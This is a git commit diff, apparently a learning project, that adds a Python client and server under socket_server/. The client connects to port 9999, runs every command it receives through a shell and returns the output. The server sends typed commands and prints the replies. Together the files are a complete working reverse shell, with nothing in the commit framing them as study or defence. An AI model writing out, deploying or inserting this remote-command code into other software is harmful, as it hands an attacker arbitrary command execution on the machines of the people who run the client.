6b122f0a7198b9bff9b617f0c493a420fc846547
xuqing <178919347@qq.com>
2018-06-03 23:47:58 +0800

    sort files

---
+++ socket_server/client.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python
+# coding:utf-8
+
+import os
+import socket
+import subprocess
+
+s = socket.socket()
+host = '127.0.0.1'
+port = 9999
+
+s.connect((host,port))
+
+while 1:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == "cd":
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE)
+        output_bytes = cmd.stdout.read()
+        output_str = str(output_bytes,'gbk')
+        s.send(str.encode(output_str + str(os.getcwd()) + '>'))
+        print(output_str)
+
+
+# Close connection
+s.close()
---
+++ socket_server/server.py
@@ -0,0 +1,80 @@
+#!/usr/bin/env python
+# coding:utf-8
+
+# create socket (allows two computers to connect)
+import socket
+
+import sys
+
+
+def socket_create():
+    try:
+        global host
+        global port
+        global s
+        host = ''
+        port = 9999
+        s = socket.socket()
+    except socket.error as msg:
+        print("Create socket error: " + str(msg))
+
+
+# Bind socket to port and wait for connection from clent
+def socket_bind():
+    try:
+        global host
+        global port
+        global s
+        print("Binding socket to port: " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as msg:
+        print("Socket Binding error: "+ str(msg) + '\n' + "Retrying...")
+        socket_bind()
+
+# Establish a connection with client(socket must be listening for them)
+def socket_accpet():
+    conn,address = s.accept()
+    print("Connection has been established |" + "IP " + address[0] + "| Port " + str(address[1]))
+    send_commands(conn)
+    conn.close()
+
+def send_commands(conn):
+    while 1:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            s.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024),"utf-8")
+            print(client_response,end="")
+
+def main():
+    socket_create()
+    socket_bind()
+    socket_accpet()
+
+if __name__ == '__main__':
+    main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
